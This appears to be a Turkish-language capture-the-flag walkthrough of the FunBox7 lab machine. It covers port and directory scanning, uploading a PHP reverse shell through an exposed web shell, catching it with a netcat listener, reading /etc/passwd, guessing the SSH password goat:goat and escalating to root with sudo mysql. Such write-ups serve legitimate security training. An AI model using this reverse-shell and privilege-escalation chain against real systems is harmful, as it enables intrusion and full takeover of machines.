@@ -1,0 +1,119 @@
+      ####enumeration
+
+      ####Nmap
+nmapBasit bir tarama ile başlayacağız .
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap $targetip     
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 10:27 EST
+Nmap scan report for $targetip
+Host is up (0.036s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+80 numaralı bağlantı noktasındaki web sunucusuna göz atarsak, varsayılan bir Apache web sayfası buluruz.
+
+      ####GoBuster
+Ardından, /usr/share/dirb/wordlists/common.txt wordlist ile web sunucusunun gizli dosyalarını ve dizinlerini kaba kuvvetle çalıştırmayı deneyeceğiz , PHP, metin ve HTML dosyalarını arayacağız.
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://$targetip -w /usr/share/dirb/wordlists/common.txt -x php,txt,html
+===============================================================
+Gobuster v3.0.1
+...
+/index.html (Status: 200)
+/javascript (Status: 301)
+/mini.php (Status: 200)
+/phpmyadmin (Status: 301)
+/robots.txt (Status: 200)
+...
+Çıktı, özel bir Zerion Mini Shell 1.0 uygulaması içeren mini.php'yi içerir.
+
+      ####exploitation
+
+      ####Dosya Yükleme Güvenlik Açığı
+Bu sayfa web köküne ( /var/www/html/ ) yüklemelere izin verebilir . PHP dosya formatı destekleniyor gibi göründüğünden, bir PHP ters kabuğu yüklemeyi deneyelim. IP adresini ve port numarasını gerektiği gibi güncelleyeceğiz.
+┌──(kali㉿kali)-[~]
+└─$ cp /usr/share/webshells/php/php-reverse-shell.php .
+                                                                                                                              
+┌──(kali㉿kali)-[~]
+└─$ sed -i "s/$ip = '127.0.0.1';/$ip = '$attackerip';/g" php-reverse-shell.php                            
+                                                                                                                              
+┌──(kali㉿kali)-[~]
+└─$ sed -i "s/$port = 1234;/$port = 4444;/g" php-reverse-shell.php
+                                                                                                                              
+┌──(kali㉿kali)-[~]
+└─$
+Ardından, Gözat'ı tıklayacağız , ters kabuk dosyamızı seçeceğiz ve yükle'yi tıklayacağız . Dosya yüklendikten sonra web kök dizini listesinde görünür. 4444 numaralı bağlantı noktasında bir Netcat dinleyicisi başlatalım ve
+http://$targetip/php-reverse-shell.php adresine giderek kabuğumuzu tetikleyelim.
+┌──(kali㉿kali)-[~]
+└─$ curl http://$targetip/php-reverse-shell.php                                          
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Successfully opened reverse shell to $attackerip:4444
+...
+Netcat dinleyicimiz bize www-data kullanıcı olarak bir kabuk sunuyor.
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [$attackerip] from (UNKNOWN) [$targetip] 34362
+Linux funbox7 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 15:54:03 up 25 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+      ####Kullanıcı Numaralandırma
+Numaralandırma çalışmalarımızın bir parçası olarak hedefteki kullanıcı hesaplarını kontrol edelim:
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+...
+karla:x:1000:1000:karla:/home/karla:/bin/bash
+...
+harry:x:1001:1001:,,,:/home/harry:/bin/bash
+sally:x:1002:1002:,,,:/home/sally:/bin/bash
+goat:x:1003:1003:,,,:/home/goat:/bin/bash
+oracle:$censoredhash:1004:1004:,,,:/home/oracle:/bin/bash
+lissy:x:1005:1005::/home/lissy:/bin/sh
+Dosya, kullanıcı için parola karmasını içeriyor olsa da, oraclebu parolayı kırmak büyük olasılıkla ayrıcalıklarımızı ilerletmeyecektir, bu yüzden şimdilik bunu atlayacağız.
+passwd dosyası birkaç kullanıcı içerir ve bunun dışında her kullanıcının bir lissyana dizini vardır:
+$ ls -l /home
+total 20
+drwxr-xr-x 2 goat   goat   4096 Feb 16 13:25 goat
+drwxr-xr-x 2 harry  harry  4096 Jan 28 12:03 harry
+drwxr-xr-x 2 karla  karla  4096 Feb 16 13:23 karla
+drwxr-xr-x 2 oracle oracle 4096 Feb 16 13:23 oracle
+drwxr-xr-x 2 sally  sally  4096 Jan 28 12:03 sally
+
+      ####SSH
+hydra Çevrimiçi bir SSH kaba kuvvet saldırısı (birkaç dakika sürecek) gibi bir araç kullanabiliriz , ancak bir adım geri gidelim ve daha az karmaşık parola denemelerini deneyelim. Kullanıcı adını her kullanıcı için parola olarak deneyerek başlayacağız.
+İşte deneyeceğimiz kullanıcı adı ve şifre çiftleri:
+goat:goat
+harry:harry
+karla:karla
+oracle:oracle
+sally:sally
+Kimlik bilgisi çiftlerinden biri ( goat:goat) çalışıyor!
+┌──(kali㉿kali)-[~]
+└─$ ssh goat@$targetip
+goat@$targetip's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-117-generic x86_64)
+...
+goat@funbox7:~$ id
+uid=1003(goat) gid=1003(goat) groups=1003(goat),111(ssh)
+
+      ####Sudo Kötüye Kullanımı
+Şimdi ayrıcalıklarımızı yükseltmeye çalışalım. Hızlı bir sudo taramasıyla başlayacağız:
+goat@funbox7:~$ sudo -l
+Matching Defaults entries for goat on funbox7:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User goat may run the following commands on funbox7:
+    (root) NOPASSWD: /usr/bin/mysql
+Tarama, /usr/bin/mysql dosyasını root olarak çalıştırabileceğimizi gösteriyor sudo. Bir GTFOBins makalesi , bize bir kök kabuğu verebilecek basit bir komut sunar.
+goat@funbox7:~$ whoami
+goat
+goat@funbox7:~$ sudo /usr/bin/mysql -e '\! /bin/sh'
+# whoami
+root
+Bu mükemmel çalışıyor. Bir kök kabuğumuz var.
